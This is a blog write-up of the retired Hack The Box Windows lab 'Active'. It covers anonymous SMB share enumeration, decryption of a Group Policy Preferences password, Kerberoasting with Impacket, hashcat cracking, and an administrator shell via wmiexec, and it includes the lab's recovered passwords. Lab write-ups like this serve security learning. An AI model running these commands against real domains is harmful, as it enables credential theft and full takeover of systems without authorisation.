---
layout: post
title: Active
date: '2025-01-03'
description: "Active is a retired easy Windows machine from HTB"
categories: [HTB]
---

## MACHINE INFO

> **[Active](https://app.hackthebox.com/machines/148)** is a retired easy Windows machine on HTB which involves exploiting vulnerabilities in SMB shares and Group Policy Preferences (GPP) encryption to gain initial access. The challenge progresses with a Kerberoasting attack to obtain credentials, ultimately leading to privileged access as the Administrator.

Because Windows is a new concept to me, I decided to do the lab using the guided mode. Guided mode breaks down the process of solving the lab into tasks.

## ENUMERATION
Nmap Scan of the target:
```shell
p0s3id0n@kali:~/Machines/htb/labs/active$ sudo nmap -sCV -T4 -vv -p- 10.10.10.100 -Pn    
[sudo] password for p0s3id0n: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 19:09 EDT
<---snip--->
Nmap scan report for active.htb (10.10.10.100)
Host is up, received user-set (0.48s latency).
Scanned at 2024-07-03 19:09:51 EDT for 1483s
Not shown: 65505 closed tcp ports (reset)
PORT      STATE    SERVICE        REASON          VERSION
53/tcp    open     domain         syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec   syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-07-03 23:33:13Z)
135/tcp   open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open     ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?  syn-ack ttl 127
464/tcp   open     kpasswd5?      syn-ack ttl 127
593/tcp   open     ncacn_http     syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped     syn-ack ttl 127
3268/tcp  open     ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped     syn-ack ttl 127
4257/tcp  filtered vrml-multi-use no-response
5722/tcp  open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open     mc-nmf         syn-ack ttl 127 .NET Message Framing
10005/tcp filtered stel           no-response
18999/tcp filtered unknown        no-response
33758/tcp filtered unknown        no-response
35156/tcp filtered unknown        no-response
42247/tcp filtered unknown        no-response
47001/tcp open     http           syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open     ncacn_http     syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open     msrpc          syn-ack ttl 127 Microsoft Windows RPC
53353/tcp filtered unknown        no-response
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-03T23:34:14
|_  start_date: 2024-07-03T08:27:35
|_clock-skew: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 49509/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38631/udp): CLEAN (Failed to receive data)
|   Check 4 (port 2846/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:34
Completed NSE at 19:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:34
Completed NSE at 19:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:34
Completed NSE at 19:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1484.27 seconds
           Raw packets sent: 73378 (3.229MB) | Rcvd: 70307 (2.812MB)
```

## EXPLOTATION
**GUIDE 1:**
**How many SMB shares are shared by the target?**
> ` smbclient` is a command-line tool that provides access to SMB resources.
```shell
smbclient -L 10.10.10.100 -N
```
The command above lists SMB shares. The flag `-N` instructs SMB to list shares without requiring a password to be provided or in other words with anonymous login.
Based on the output, I got a total of 7 shares.
![img-description](1.png)


**TASK 2:**
**What is the name of the share that allows anonymous read access?**
`smbmap`: a tool for enumerating and interacting with SMB shares on Windows systems
The flag `-H` is used to specify the target. The whole command lists all SMB shares and their relevant permissions. From the output, the only share with read only access is  `Replication`.
![img-description](2.png)

**TASK 3:**
**Which file has encrypted account credentials in it?**
	*Hint: It's an XML File*
Since Replication is the only share we can access, I used smbclient to start a direct connection to it to be able to interact with it.
```shell
smbclient //10.10.10.100/Replication
```

The following blogpost on hacktricks gave me an idea on how to interact with a smbclient session: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

The idea was to get everything from the Replication share and search for the file (an XML file as per the hint). In order to do that, I had to use the following commands after starting the smbclient session.
```
>mask "" 
>recurse ON 
>prompt OFF 
>mget *
```

Explanation on each command:
	1. `mask " "`: sets the file mask to an empty string, meaning all files will be included.
	2. `recurse ON`: enables recursive operations, allowing you to download files from all directories and subdirectories
	3. `prompt OFF`: Turns off prompts, so you won't be asked to confirm each file download.
	4. `mget *`: Downloads all files from the current directory and subdirectories to your current local directory.
![img-description](3.png)
![img-description](4.png)

As seen in the output, all files from the smb directory and subdirectories and their content get downloaded into my attack machine.
I used the `tree` command to display the directory structure. The hint says the file required is an XML file, and there was only one XML file `Groups.xml`

**TASK 4:**
**What is the decrpyted password for the SVC_TGS account?**
The XML file found above contains encrypted user credentials, below is a snippet of the contents of the file.
![img-description](5.png)

Now that I have the encrypted password, I have to decrypt it. I was not sure of how to go about this, so I refered to the hint.
	*Hint: Research topics like Group Policy Password (GPP) encryption*
I found an interesting blog post on it: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/unsecured-credentials/group-policy-preferences/gpp-password

```shell
gpp-decrypt <cpassword value>
```
And with that I successfully decrypted the password!

```shell
GPPstillStandingStrong2k18
```

**USER FLAG**
I now have a user `SVC_TGS` and the password.
The first thing I checked for was permissions that the user has on shares.
![img-description](6.png)

The user can view the Users folder. In order to see the contents of the Users share, I used smbclient to start a direct connection to it, this time authenticated as user `SVC_TGS`

```shell
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users
```
For HTB, the user flag on Windows is usually stored in the users Desktop directory so I moved to the directory. Used ls to list directory contents then used `mget*<filename>` to download the user.txt to my current attack machine directory and read it successfully completing the first part of the box!
![img-description](7.png)

## PRIVILEGE ESCALATION
**TASK 6:**
**Which service account on Active is vulnerable to Kerberoasting?**
	*Hint: Check out `GetUserSPNs.py` from Impacket.*
Kerberoasting is a new concept to me. I used the following resources to get an understanding of what it is:
> https://youtu.be/ajOr4pcx6T0?si=GIVjGpsm8v4aCB9V
> https://youtu.be/tRCvagjqx3c?si=z9VdEMcQcoNF0EGE
> https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast

Link to Impacket: https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
**Impacket** is a collection of Python classes for working with network protocols.
`GetUsersSPNS.py` is one of the tools in the Impacket suite used for enumerating Service Principal Names (SPNs) in an Active Directory (AD) environment.

```shell
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -save -outputfile GetUserSPNs.txt
```
Breakdown of the command:
- `impacket-GetUserSPNs`: the script from the Impacket toolkit for enumerating SPNs
- `-request`: requests service tickets (TGS tickets) for the SPNs found. These tickets can then be cracked offline to obtain the plaintext passwords.
- `-dc-ip 10.10.10.100 `: Specifies the IP address of the domain controller to query.
- `active.htb/SVC_TGS:GPPstillStandingStrong2k18`: Provides the domain name, username, and password for authentication.
- `-save`: saves the extracted service tickets to disk. The default location for these tickets is the current directory.
- `-outputfile GetUserSPNs.txt`: Specifies the file where the results will be saved.

From the output the service account vulnerable to Kerberoasting is the `Administrator`
![img-description](8.png)

**TASK 7:**
**What is the plaintext password for the administrator account?**
	*Hint: hashcat is a nice tool for cracking this kind of challenge / response.*
For this, I read the contents of the service ticket obtained from the previous task. The password cracking tool recommended from the hint was hashcat.
![img-description](9.png)

Hashcat command used:
```shell
hashcat -m 13100 -a 0 GetUsersSPNs.txt /usr/share/wordlists/rockyou.txt 
```
Breakdown of command:
- `-m 13100`: Specifies the hash mode for Kerberos 5 TGS-REP etype 23. This mode is specifically used for cracking Kerberos service tickets.
- `-a 0`: Specifies the attack mode as a dictionary attack (using a wordlist).
- `GetUsersSPNs.txt`: file containing the hash to be cracked
- `/usr/share/wordlists/rockyou.txt`: path to the wordlist to be used.

And with that I successfully got the Administrator's password.
![img-description](10.png)

```shell
Ticketmaster1968
```

**TASK 8:**
**Submit the flag located on the administrator's desktop.**

After doing some research online, I got a hint towards using `wmiexec.py` to start a shell that will enable me to interact with the target system as the administrator.

```shell
impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100 
```
Breakdown of the command:
- `impacket-wmiexec`: command to run the `wmiexec` tool from the Impacket toolkit.
- `active.htb/administrator:Ticketmaster1968`: Specifies the domain, username and password for authentication to the target machine.
- `@10.10.10.100`: specifies the target's IP

![img-description](11.png)
![img-description](12.png)

Usually in HTB labs, the root flag in Windows Machines is stored in the Administrator\Desktop directory.
I used the help command to learn how to access the root.txt file containing the flag. The flag got downloaded to my current directory on my attack machine and I successfully got root!

![img-description](13.png)
![img-description](14.png)